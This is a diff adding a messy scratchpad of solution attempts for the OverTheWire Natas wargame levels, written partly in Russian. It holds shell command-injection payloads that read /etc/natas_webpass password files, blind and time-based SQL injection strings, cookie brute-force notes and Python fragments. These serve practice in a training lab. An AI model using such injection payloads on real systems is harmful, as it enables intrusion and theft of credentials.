@@ -1,0 +1,267 @@
+. ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas11
+
+
+
+APACHE_LOG_DIR
+${APACHE_LOG_DIR%v*he2}
+
+
+
+http://natas10.natas.labs.overthewire.org/?needle=.+%24%7BAPACHE_LOG_DIR%25v*he2%7Detc%24%7BAPACHE_LOG_DIR%25v*he2%7Dnatas_webpass%24%7BAPACHE_LOG_DIR%25v*he2%7Dnatas11&submit=Search
+
+
+{"showpassword":"no","bgcolor":"#000000"}
+UK"�H+O%pSWh]UZ-T%UhRGzAGh
+
+ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw=
+
+
+
+
+
+
+
+
+SELECT * from users where username=\"REQUEST\";
+SELECT * from users;
+
+
+
+natas16" AND encode('LEFT(password,str(i))','1')=encode('text','1') ; --
+
+
+
+
+
+
+'natas16" AND cast('LEFT(password,str(i))' as binary)=cast('text' as binary) ; -- 
+
+
+
+$
+
+
+
+ grep -i "$(cut -c1-1 Desktop${APACHE_LOG_DIR%v*he2}123.txt)" Desktop/bandit.txt 
+?African:-1
+
+a=$(( b==A ? c : d ))
+
+
+cut -c0-0 bandit.txt
+$(cut -c$($(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas17) = A? 1 : 20)-$($(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas17) = A? 1 : 20) ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16)
+
+
+${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16
+20 - q
+2 - a
+
+
+
+
+
+
+
+
+
+
+
+короче смотрится кука, если есть, то сессия стартуется и проверяетсся, имеется ли атрибут админ в сессии (типа старая сессия), если есть(любая), то пускает с сообщением "сессия старт ок", если нет, то пускает с доп. сообщением "сессия стар"
+и выдает админкий флаг(=0)
+
+после печатается текст в зависимости от админского атрибута (0 - херня, 1 - секрет)
+
+т.е. если кука просто выставлена новая, то ниче не будет...
+
+
+если куки нет, то смотрят, пришли ли логин с паролем (если нет, то просто выдается страничка с просьбой это ввести), дальше создают сессию с логиом и устанавливают админскую куку = 0
+
+
+
+
+
+короче, надо перебрать куки с 0 до 1000, я думаю...
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+$(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas17)
+
+
+
+grep -c L <<< $(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas17)                            -если 1 символ совпадает с L, то выводит 1, в другом случае - 0
+
+
+10 - ничего - не совпало
+11 - w (Brown) - Cовпало
+
+
+
+$(cut -c1$(grep -c L <<< $(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas17))-1$(grep -c L <<< $(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas17)) ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16)
+
+
+
+
+
+$(cut -c1$(grep -c W <<< $(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16))-1$(grep -c W <<< $(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16)) ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16)
+
+
+
+$(cut -c1$(grep -c W <<< $(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16))-11 dictionary.txt)
+
+
+
+
+
+
+${$(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16)%W}
+
+
+SEE ALSO
+   Regular Manual Pages
+       awk(1), cmp(1), diff(1), find(1), gzip(1), perl(1), sed(1), sort(1), xargs(1), zgrep(1), read(2), pcre(3), pcresyntax(3), pcrepattern(3), terminfo(5), glob(7), regex(7).
+
+
+
+$[ $(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16) = W ]
+
+
+
+0 - ok
+1 - ne ok
+
+
+$(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16)
+
+
+в начале могу задать букву, которую буду проверять в переменной, а потом если ок, то ничего не приписывать, иначе цифру
+или лучше просто катить потом снаружи еще разок
+${var=W}${var%$(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16)}${var%$(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16)}${var%$(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16)}
+
+cut -c3-3 $(echo ${var=W}${var%$(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16)}1)
+
+
+
+
+${var=W}${var%$(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16)}${var%$(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16)}${var%$(cut -c1-1 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16)}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+voc = '${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16'
+num = '$(cut -c%c-%c ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16)' %(i, i)
+
+tmpstr = '$(cut -c1' + num + '-1%c' % alphabet[j] + voc + ')' 
+
+
+
+needle=$(cut -c16-1$(cut -c9-9 ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16) ${APACHE_LOG_DIR%v*he2}etc${APACHE_LOG_DIR%v*he2}natas_webpass${APACHE_LOG_DIR%v*he2}natas16)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+/var/www/natas/natas14/index.php
+
+
+
+
+
+natas18" AND IF(MID(password,1,1) = 'a',SLEEP(2),0) ; -- 
+
+
+natas18" AND IF(cast(LEFT(password,'+str(i)+') as binary)=cast(\'' + password + alphabet[j] + '\' as binary),SLEEP(2),0) ; -- 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
